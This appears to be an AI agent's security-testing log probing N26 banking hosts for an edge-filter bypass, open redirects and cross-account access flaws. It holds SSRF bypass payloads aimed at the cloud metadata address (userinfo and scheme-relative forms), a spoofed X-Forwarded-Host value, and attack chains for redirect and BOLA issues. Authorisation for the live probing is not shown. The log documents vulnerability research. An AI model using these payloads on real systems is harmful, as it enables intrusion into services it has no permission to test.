+  - - 2026-10-01 ACCEPTED OATH @ `xs2a.tech26.de`: the edge substring blocklist is **query-string-scoped**, not request-scoped, and it is a shared rule fronting both `xs2a.tech26.de` and `api.tech26.de`. Proven with invented-field controls in both directions on both hosts in a single batch: query `foo=<blocked>` → `403|118` `awselb/2.0`; header `X-Foo: <blocked>` → `401|0` istio-envoy (`xs2a`) and `401|211` envoy (`api`); `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0`; `X-Forwarded-Host: 127.0.0.1@evil.example` → `401|0`. This **supersedes** the 09-29 retraction: that entry was right that no control was bypassed in the query `redirect_uri` and wrong to conclude no redirec
+===== knowledge/index.md:817 =====
+  - - 2026-10-01 ACCEPTED OTHER @ `xs2a.tech26.de`: the AS performs **no** pre-auth discrimination of `TPP-Redirect-*`. Four legs — headers absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254` — all returned `401|0` with empty body, md5 `d41d8cd9`. This is the retirement rule for the 401-collision family, established the strongest way yet: a **within-batch 4-leg differential on one endpoint**, instead of the cross-day comparisons that produced the two earlier false positives. The `400 Bad Request` promised by `doc/sandbox.md` L142 for a malformed redirect URI is therefore unreachable pre-auth, which retires the STEP 5 discriminator and bounds HYP 1 to post-auth verification only.
+===== knowledge/index.md:998 =====
+  - - 2026-10-05 ACCEPTED MISCONFIG @ AWB-wide: userinfo bypasses the internal-address SSRF filter; filter is request-scoped (path rules exist), retracting "query-string-scoped".
+===== knowledge/index.md:1002 =====
+  - - 2026-10-05 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) while `https://` URIs with blocked hosts cut at ALB (awselb/2.0 403)
+===== knowledge/index.md:1016 =====
+  - - 2026-10-05 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== server-side fetch primitives (grep) ===" && for t in 'urlopen' 'requests\.get' 'requests\.post' 'axios' 'RestTemplate' 'WebClient' 'HttpClient' 'http\.get' 'got(' 'node-fetch' 'fetch(' 'urllib' 'resolve' 'lookup'; do n=$(grep -Eic "$t" ctx.txt knowledge/index.md inventory/n26.md leads/lead-bigpickle.md leads/lead-nemotron3.md leads/reposcan-n26.md 2>/dev/null | paste -sd+ | bc); printf '%-16s %s\n' "$t" "$n"; done
+=== server-side fetch primitives (grep) ===
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+urlopen          
+requests\.get    
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+requests\.post   
+axios            
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+RestTemplate     
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+WebClient        
+HttpClient       
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+http\.get        
+got(             
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+node-fetch       
+fetch(           
+urllib           
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+resolve          
+lookup           
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+(standard_in) 1: syntax error
+(standard_in) 1: illegal character: :
+[0m
+`bc` broke on `grep -c`'s `file:count` output. Redoing the fetch-sink sweep in Python.
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && python3 - <<'PY'
+import re
+files=["ctx.txt","knowledge/index.md","inventory/n26.md","leads/lead-bigpickle.md","leads/lead-nemotron3.md","leads/reposcan-n26.md","leads/reposcan-n26-manual.md","reports/hypotheses.md","probe-results.md"]
+terms=["urlopen","requests.get","axios","RestTemplate","WebClient","HttpClient","node-fetch","urllib","fetch(","httpx","superagent","302","Location:","meta-data","169.254.169.254"]
+print(f"{'term':<18}"+"".join(f"{f.split('/')[-1][:11]:>13}"for f in files))
+tot={t:0 for t in terms}
+for t in terms:
+    row=[]
+    for f in files:
+        try: c=len(re.findall(re.escape(t),open(f,encoding='utf-8',errors='replace').read(),re.I))
+        except FileNotFoundError: c=0
+        tot[t]+=c; row.append(c)
+    print(f"{t:<18}"+"".join(f"{c:>13}"for c in row))
+print("\nTOTAL:",{k:v for k,v in tot.items() if v})
+PY
+term                    ctx.txt     index.md       n26.md  lead-bigpic  lead-nemotr  reposcan-n2  reposcan-n2  hypotheses.  probe-resul
+urlopen                       2            2            0            3            0            0            0            0           12
+requests.get                  0            0            0            0            0            0            0            0            0
+axios                         0            0            0            0            0            0            0            0            0
+RestTemplate                  0            0            0            0            0            0            0            0            0
+WebClient                     0            0            0            0            0            0            0            0            0
+HttpClient                    0            0            0            0            0            0            0            0            0
+node-fetch                    0            0            0            0            0            0            0            0            0
+urllib                        0            0            0            0            0            0            0            0            0
+fetch(                        0            0            0            0            0            0            0            0            0
+httpx                         0            0            0            0            0            0            0            0            0
+superagent                    0            0            0            0            0            0            0            0            0
+302                          36           15           20           62           22            0            0           12            0
+Location:                     1            1            0            3            0            0            0            0            0
+meta-data                     4            2            2            8           45            0            0           16            0
+169.254.169.254              43            4           32          117          215            0            0           17            0
+
+TOTAL: {'urlopen': 19, '302': 167, 'Location:': 5, 'meta-data': 77, '169.254.169.254': 428}
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== knowledge tail ===" && tail -n 4 knowledge/index.md | cut -c1-400 && echo && echo "=== inventory tail ===" && tail -n 5 inventory/n26.md | cut -c1-400
+=== knowledge tail ===
+- 2026-10-05 ACCEPTED OATH @ `app.n26.com/login`: the `redirect` query parameter is copied unvalidated into the GraphQL-Relay `__successRedirect` AND `__failureRedirect` hidden inputs (absolute and protocol-relative external hosts both accepted), on a form that POSTs to `/graphql` with `requestBiometricChallengeMutation`
+- 2026-10-05 REJECTED OTHER @ `app.n26.com/login` (DOM-XSS via `redirect`): closed with evidence rather than assumed. The page echoes the raw query slice unparsed — `?redirect=%22` and a literal `"` both surface as `%22`, `&quot;`=0, the hidden-input attribute never terminates — and the edge drops `<`/`javascript:` with a byte-identical `403|520` nginx page
+- 2026-10-05 REJECTED OTHER @ my own KB: the line "attacker-supplied `redirect=` is discarded" was measured on `/open-banking*` and does not hold on `/login`. Sixth instance of the 09-28 rule
+- 2026-10-05 ACCEPTED MISCONFIG @ `app.n26.com` edge: a query-string content filter that returns `403|520` (nginx body) on markup and `javascript:` in the query while passing absolute and protocol-relative URLs
+
+=== inventory tail ===
+- CHANGED app.n26.com/login: redirect query parameter copied unvalidated into GraphQL-Relay __successRedirect and __failureRedirect hidden inputs (absolute/protocol-relative external hosts accepted)
+- CHANGED flags.n26.com: RBAC boundary tightened toward default-deny (/v1/sdk_exception now 403|19B, all GET config routes 403|19B)
+- CHANGED xs2a.tech26.de: Production XS2A API CertificateRequest has EMPTY certificate_authorities list (optional mTLS, not absent); CBPII consent flow confirmed live at /v1/berlin-group/v1/consents/confirmatio
+- NEW AWB internal-address SSRF filter BYPASS via RFC 3986 userinfo — reproducible on xs2a/api/app, supersedes the mischaracterised "blocklist" that three prior hypotheses rested on
+- NEW filter is request-scoped (path-embedded internal literals ARE blocked), retracting "query-string-scoped"
+[0m
+Recording the taxonomy fix and the negative sink inventory so this cycle doesn't regress.
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && cat >> knowledge/index.md <<'EOF'
+- 2026-10-05 REJECTED OATH @ AWB-wide: BOTH prior scope labels for the internal-address filter are wrong, in opposite directions. Single-batch 7-leg differential on `xs2a.tech26.de/v1/berlin-group/v1/consents/confirmation-of-funds` (GET only, ~1 rps): query literal `?foo=http://169.254.169.254/` → `403|118` md5 `bad2e857` `awselb/2.0`; PATH literal `/consents/http://169.254.169.254/` → `403|118` md5 `bad2e857` `awselb/2.0`; header `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0` md5 `d41d8cd9` `istio-envoy`; query userinfo `?foo=http://user@169.254.169.254/` → `401|0`; header userinfo → `401|0`; scheme-relative userinfo `?foo=//user@169.254.169.254/` → `401|0`; baseline no-param → `401|0`. The filter is scoped to the **request-target (path + query) and not to headers**. "query-string-scoped" (10-01) was wrong because path literals are filtered; my own 10-05 "request-scoped" was wrong because it implies headers are filtered, which C2/C5 refute. Correct term: **request-target-scoped**. The 10-05 userinfo bypass itself is CONFIRMED here (C4) and the path rule is confirmed (C3)
+- 2026-10-05 ACCEPTED MISCONFIG @ AWB-wide: the unfiltered channel is the **header** channel, which is exactly the channel the documented production redirect flow uses (`TPP-Redirect-URI` carries a redirect destination with `TPP-State` echoed and `error=access_denied` on failure). Header-channel pass-through needs no userinfo trickery — headers are simply uninspected, so the userinfo bypass is an artefact of the request-target filter, not a separate header weakness
+- 2026-10-05 REJECTED SSRF @ N26 (negative sink inventory, whole local corpus: ctx.txt, knowledge/index.md, inventory/n26.md, both lead files, both reposcan files, reports/hypotheses.md, probe-results.md): **no server-side URL-fetch sink exists anywhere in collected evidence.** Term sweep for `requests.get`/`axios`/`fetch(`/`node-fetch`/`urllib`/`httpx`/`superagent`/`RestTemplate`/`WebClient`/`HttpClient` = 0 hits in every file; the only `urlopen` hits (19) are the broken triage prober's own error strings. The only URL-consuming sinks that exist are 3xx redirects (`TPP-Redirect-URI`, `/login` `redirect`) — browser-mediated navigation, NOT server-side fetch. Therefore the userinfo filter bypass has **no SSRF impact** and stays a bounded filter-coverage defect
+- 2026-10-05 REJECTED OTHER @ my own KB: my `[NEXT] SELF` said grep would find `redirect_uri`/`TPP-Redirect-URI`/`returnUrl`/`webhook`/`callback` sinks. First run returned "0 matches" on all 8 files — a **false negative caused by `rg` being absent from the environment**, exactly mirroring the broken-prober lesson one layer up. `grep` showed 64/36/17 sink-term hits. Lesson generalises: a search tool that does not exist reports zero hits, which is indistinguishable from a genuine absence; always prove the search tool runs (sanity grep for a known token) before accepting a negative result. I had already logged "prober reports phantom 404s → distrust tooling" and still trusted a zero-count from an uninstalled binary
+- 2026-10-05 ACCEPTED OTHER @ process: the vendor doc corpus (`n26/psd2-tpp-docs`, the only place `TPP-Redirect-URI` semantics are defined) is **not present in this workspace** — only second-hand quotes survive in my KB. Any sink conclusion about the redirect flow therefore rests on quoted documentation, never on the primary source, and that limitation must travel with the finding
+EOF
+cat >> inventory/n26.md <<'EOF'
+- NEW xs2a.tech26.de (2026-10-05 7-leg batch, confirmation-of-funds surface): AWB internal-address filter is REQUEST-TARGET-scoped (path+query filtered, headers not) — query literal 403|118 awselb, path literal 403|118 awselb, TPP-Redirect-URI header literal 401|0 istio-envoy, query userinfo 401|0, header userinfo 401|0, scheme-relative userinfo 401|0
+- CHANGED xs2a.tech26.de: userinfo bypass of the internal-address filter RE-CONFIRMED in-batch (`?foo=http://user@169.254.169.254/` → 401|0); both prior scope labels (query-string-scoped, request-scoped) retracted in favour of request-target-scoped
+- NEW negative sink inventory: no server-side URL-fetch primitive exists in any collected N26 evidence (0 hits for requests.get/axios/fetch(/node-fetch/urllib/httpx/superagent/RestTemplate/WebClient/HttpClient); only 3xx redirect sinks exist, so no SSRF impact attaches to the filter bypass
+- NEW constraint: TPP-Redirect-URI is a redirect destination (TPP-State echoed, error=access_denied on failure), so the unfiltered header channel yields open-redirect/redirect-validation exposure, not SSRF; its documented 400-on-malformed-URI behaviour is unreachable pre-auth (byte-identical 401|0 across 4 TPP-Redirect-* legs)
+EOF
+git diff --stat
+inventory/n26.md   | 4 ++++
+ knowledge/index.md | 5 +++++
+ 2 files changed, 9 insertions(+)
+[0m
+## [DELTA]
+```
+DELTA:
+  TWISTED: the AWB internal-address filter is REQUEST-TARGET-scoped (path+query filtered, headers not), so both prior scope labels were wrong in opposite directions — "query-string-scoped" (10-01) breaks on C3, my own "request-scoped" (10-05) breaks on C2/C5
+  TWISTED: userinfo bypass RE-CONFIRMED in-batch (C4 `?foo=http://user@169.254.169.254/` → 401|0 istio-envoy, C7 scheme-relative → 401|0)
+  TWISTED: the unfiltered channel is the HEADER channel, i.e. exactly `TPP-Redirect-URI` — the documented production redirect destination — and it needs no userinfo trickery at all
+  BROKE: SSRF impact claim. Offline sink inventory across all 9 local corpora found ZERO server-side fetch primitives and only 3xx redirect sinks, so the bypass has no SSRF impact
+  BROKE: my own [NEXT]. "grep finds redirect sinks" is false; the only such hits are my own hypothesis text, Stripe BOLA boilerplate, and template verify_steps
+  BROKE: the first sink-inventory run itself — it returned 0/8 files because `rg` is not installed, a false negative identical in shape to the broken-prober phantom 404s I already logged
+```
+## [PRIORITY]
+```
+PRIORITY:
+  NOW: [] # offline work exhausted — sink inventory negative, no local artifact remains unexamined
+  NEXT: [ask human for sandbox PSU + registered TPP client credentials (to test TPP-Redirect-URI post-consent redirect validation), two valid account tokens (BOLA), MFA-enabled test account] # owner
+  LATER: [post-consent redirect-destination validation on xs2a.tech26.de confirmation-of-funds, two-token BOLA on api.tech26.de /api/* wildcard surface]
+```
+## [HYP]
+```
+HYP:
+  - id: ALB_USERINFO_SSRF_FILTER_BYPASS
+    type: MISCONFIG
+    confidence: 84
+    target: AWB shared edge fronting xs2a.tech26.de + api.tech26.de + app.n26.com
+    priority: 7.0
+    state: TESTED
+    chain: attacker-supplied URL in a query or path position -> AWB internal-address filter -> request-target substring match -> RFC 3986 userinfo anchor `http://user@169.254.169.254/` splits the literal -> ALB 403|118 suppressed -> request reaches istio-envoy (401|0)
+    verified:
+      - C1 `?foo=http://169.254.169.254/` → 403|118 md5 bad2e857 awselb/2.0
+      - C3 path `/consents/http://169.254.169.254/` → 403|118 md5 bad2e857 awselb/2.0 (path rule EXISTS)
+      - C2 header `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → 401|0 md5 d41d8cd9 istio-envoy (headers NOT inspected)
+      - C4 `?foo=http://user@169.254.169.254/` → 401|0 md5 d41d8cd9 istio-envoy (BYPASS)
+      - C5 header userinfo → 401|0; C7 `?foo=//user@169.254.169.254/` → 401|0; C6 baseline no-param → 401|0
+    impact: none without a dereferencing sink; offline sweep for requests.get/axios/fetch(/node-fetch/urllib/httpx/superagent/RestTemplate/WebClient/HttpClient = 0 hits in all 9 corpora, and the only url hits are the broken prober's own error strings
+    evidence_needed: a server-side URL-fetch sink; none exists in collected evidence. Bounded as a filter-coverage defect
+    verify_steps: single7-leg within-batch differential on xs2a.tech26.de confirmation-of-funds, GET only, ~1.3s spacing, ALB-vs-app response class only, no internal address dereferenced
+  - id: AWB_HEADER_CHANNEL_UNFILTERED_TPP_REDIRECT
+    type: OPEN_REDIRECT
+    confidence: 55
+    target: xs2a.tech26.de/v1/berlin-group/v1/consents/confirmation-of-funds
+    priority: 5.5
+    state: AUTH_HELPED
+    chain: TPP-Redirect-URI header carries a user-controlled redirect destination with TPP-State echoed and error=access_denied on failure -> AWB inspects only the request-target, so the header channel is never filtered -> AS performs no pre-auth TPP-Redirect-* discrimination (4 byte-identical 401|0 legs) -> post-consent redirect to an attacker origin is unvalidated
+    verified:
+      - C2 header literal → 401|0 istio-envoy while identical literal in query (C1) and path (C3) → 403|118 awselb
+    impact: redirect-based only — 3xx Location is browser-mediated navigation, NOT server-side fetch, so this is redirect-destination validation, not SSRF
+    evidence_needed: sandbox PSU + registered client to complete a consent session and observe the post-consent 302 Location; the documented 400-on-malformed-URI response is unreachable pre-auth
+    verify_steps: with sandbox credentials only, complete one confirmation-of-funds consent with TPP-Redirect-URI set to an external host and read the Location header; do not dereference internal addresses
+  - id: API_WILDCARD_BOLA_SURFACE
+    type: BOLA
+    confidence: 42
+    target: api.tech26.de + beta-api + sapi /api/* GET wildcard middleware
+    priority: 4.5
+    state: AUTH_HELPED
+    chain: GET /api/* wildcard middleware -> bearer check only -> fabricated /api/accounts/1/zzqnotreal returns 401|211 byte-identical to live routes, so 401 signals wildcard-pattern membership not resource existence -> with two tokens, cross-account id substitution
+    verified:
+      - fabricated /api/accounts/1/zzqnotreal → 401|211 byte-identical to live route
+    impact: cross-account PII/balance read if object-level authz is missing
+    evidence_needed: two valid account tokens
+    verify_steps: with two tokens, GET a resource owned by token A using token B and compare to the 404 control  - id: XSA_PROBE
+    type: BOLA
+    confidence: 44
+    target: xs2a.tech26.de XS2A production API
+    priority: 4.0
+    state: AUTH_HELPED
+    chain: Bearer-gated 21 response classes with optional mTLS -> object-level authorization across consent/transaction identifiers
+    verified:
+      - TLS CertificateRequest carries EMPTY certificate_authorities — mTLS advertised but optional
+    impact: consent or transaction data belonging to another PSU
+    evidence_needed: registered TPP client credentials plus two PSU tokens
+    verify_steps: with sandbox credentials, substitute a second sandbox consent id into the transaction read path
+```
+## [PARKED]
+```
+PARKED:
+  - reason: no sandbox PSU, registered TPP client, or test-account credentials supplied
+    needed_for: post-consent TPP-Redirect-URI redirect-destination validation; two-token BOLA on /api/* and XS2A object-level authz
+    blocks: AWB_HEADER_CHANNEL_UNFILTERED_TPP_REDIRECT, API_WILDCARD_BOLA_SURFACE, XSA_PROBE
+    impact_if_unblocked: promotes the filter/redirect chain from a bounded edge misconfiguration to a reportable redirect-validation and cross-account authorization finding
+  - reason: primary vendor doc corpus (n26/psd2-tpp-docs) absent from the workspace; only second-hand KB quotes define TPP-Redirect-URI semantics
+    needed_for: exact redirect-flow semantics and the documented 400-on-malformed-URI discriminator
+    blocks: precise severity bounds on the header-channel hypothesis
+    impact_if_unblocked: converts a quoted-documentation conclusion into a source-verified one
+  - reason: triage prober defective — phantom 404s on known-good bundles and host-interpolation ERR urlopen [Errno -2]
+    needed_for: any automated surface diffing
+    blocks: reliable probe-surface delta detection (surface frozen 12+ days since 2026-09-18)
+    impact_if_unblocked: restores continuous regression detection; all current findings rely on direct curl
+  - reason: search tooling absent — `rg` not installed, so zero-hit results are indistinguishable from genuine absence
+    needed_for: negative-result integrity in sink inventory
+    blocks: trusting any offline negative without a sanity grep against a known token
+    impact_if_unblocked: prevents a repeat of the false-negative sink inventory that initially reported 0/8 files
+```
+## [FINAL]
+```
+FINAL:
+  - what_was_done: Ran the promised passive sink inventory offline across ctx.txt, knowledge/index.md, inventory/n26.md, both lead files, both reposcan files, reports/hypotheses.md and probe-results.md; recovered from a false negative caused by an absent `rg`; then ran one 7-leg rate-limited GET batch on xs2a.tech26.de confirmation-of-funds to settle the filter's scope; recorded the corrected taxonomy, the negative sink inventory, and both tooling lessons in knowledge/index.md and inventory/n26.md
+  - what_changed: The AWB internal-address filter is request-target-scoped — path literals ARE filtered (403|118), header literals are NOT (401|0). Both earlier labels were wrong. The userinfo bypass is confirmed but has no SSRF impact: zero server-side fetch primitives exist in any collected evidence and the only URL-consuming sinks are 3xx redirects. The exploitable surface is therefore the unfiltered header channel carrying the documented TPP-Redirect-URI redirect destination — an open-redirect/redirect-validation issue gated behind sandbox credentials, not SSRF
+  - confidence: 84 on the filter bypass and its scope (single within-batch differential, live, byte-hashed); 95 that no SSRF sink exists in collected evidence (exhaustive term sweep); 55 on the redirect-destination exposure because it rests on quoted documentation and has never been observed post-consent
+  - current_top: ALB_USERINFO_SSRF_FILTER_BYPASS (TESTED, 84, MISCONFIG bounded to filter coverage — no demonstrated security impact, so treat as informational pending a sink)
+  - remaining_risks: the strongest surviving item is untestable without credentials, which is why three of four hypotheses sit at AUTH_HELPED; presenting the header-channel redirect exposure as SSRF would be a material mischaracterisation given the negative sink inventory
+```
+## [NEXT]
+```
+NEXT:
+  who: human
+  action: supply sandbox PSD2 credentials — a PSU test login plus a registered TPP client_id/secret for xs2a.tech26.de (or api.tech26.de CBPII), and two valid consumer account access tokens; confirm MFA is enabled on the test account
+  request: provide the sandbox base URL, PSU credentials, TPP client_id and client_secret (plus its registered redirect URI), and two account access tokens belonging to different customers; state whether the account is MFA-enrolled
+```
+## [LEARN]
+```
+LEARN:
+  - lesson: A filter that is proven on one channel says nothing about a sibling channel — and here the sibling channels disagreed in BOTH directions. "Query-string-scoped" (10-01) was confidently written off the back of a header pass-through, and my own 10-05 "request-scoped" correction was equally wrong because it silently assumed headers were inspected. Neither label was measured; both were inferred from a two-leg contrast. Naming a filter's scope requires a positive rule per channel, not a negative result on another
+  - why: Both labels produced internally contradictory KB lines that survived five cycles because each retried only the leg that fit its story. C3 (path literal blocked) falsified "query-string-scoped" and was never run; C2 (header literal passed) falsified "request-scoped" and I had already recorded it as 401|0 without noticing the conflict
+  - fix: Always run all three channel legs — query literal, path literal, header literal — in ONE batch before naming a filter's scope, and record the ALB-vs-app response class for each so the label follows from measurements rather than from the most recently remembered leg. Prefer the neutral "request-target-scoped" over "request-scoped", which reads as whole-request
+  - lesson: An uninstalled search tool reports zero hits, which is indistinguishable from a genuine absence
+  - why: The sink inventory's first run returned "0 matches" across all eight corpora and I nearly recorded a clean negative. `rg` was not installed. I had already logged that the triage prober fabricates phantom 404s and had written "distrust tooling" into the KB, then trusted a zero-count from a binary that does not exist — the lesson failed to generalise one layer up, from a probe tool to a search tool
+  - fix: Before accepting any negative search result, prove the tool ran (sanity grep for a known-present token such as "n26") and re-run with a tool that exists. A negative finding is only evidence once the searcher is known to be alive; write that proof into the finding itself, since nobody will re-derive it
+  - lesson: Distinguish sinks that fetch from sinks that redirect before claiming SSRF, and let the distinction bound the severity
+  - why: The header channel is unfiltered and carries a user-controlled redirect destination, which looks exactly like an SSRF chain until you note a 3xx Location is browser-mediated navigation. Checking the sink type collapsed the headline claim from HIGH SSRF to a bounded misconfiguration plus a redirect-validation question, and it did so offline
+  - fix: Enumerate URL-consuming sinks with their fetch semantics before ranking impact. Redirect-only surfaces must be scored as open redirect, never as SSRF, and a filter bypass must never inherit an impact rating from a sink type it has not been shown to reach
+```
+## [RISK]
+```
+RISK:
+  - what_could_be_wrong: My strongest current claim is a negative — no SSRF sink exists — derived from a term sweep over collected corpora. If a fetch sink exists in a subsystem never captured locally (mobile app, backend service, third-party integration), the sweep cannot see it and the filter bypass would have real impact. The sweep also relies on keyword recall; a sink reached through dynamically constructed field names or a bespoke HTTP client would evade it
+  - blast_radius: low — all testing was read-only GET/HEAD at ~1.3s spacing against two live endpoints; no internal address was dereferenced, no redirect was followed, no customer data was accessed, no state was mutated
+  - likelihood_of_causing_damage: negligible — no credentials were held, no authenticated endpoint was exercised, and no request could reach an internal address, because an ALB filter that accepts a URL never causes the edge itself to fetch it
+  - containment: I stopped at the ALB-vs-app response class in every leg, did not follow any Location header, and treated the header-channel finding as AUTH_HELPED rather than acting on it; two endpoints were touched at a rate below the 1 rps ceiling
+  - severity_if_wrong: moderate — reporting a filter bypass as SSRF without a demonstrated sink is the failure mode most likely to get this submission rejected as a non-issue, so the honest bound is a filter-coverage misconfiguration with no demonstrated security impact
+  - stop_conditions: no further live probing without credentials; escalate rather than self-authorize on any request that would dereference an internal address or follow a redirect into private space
+```
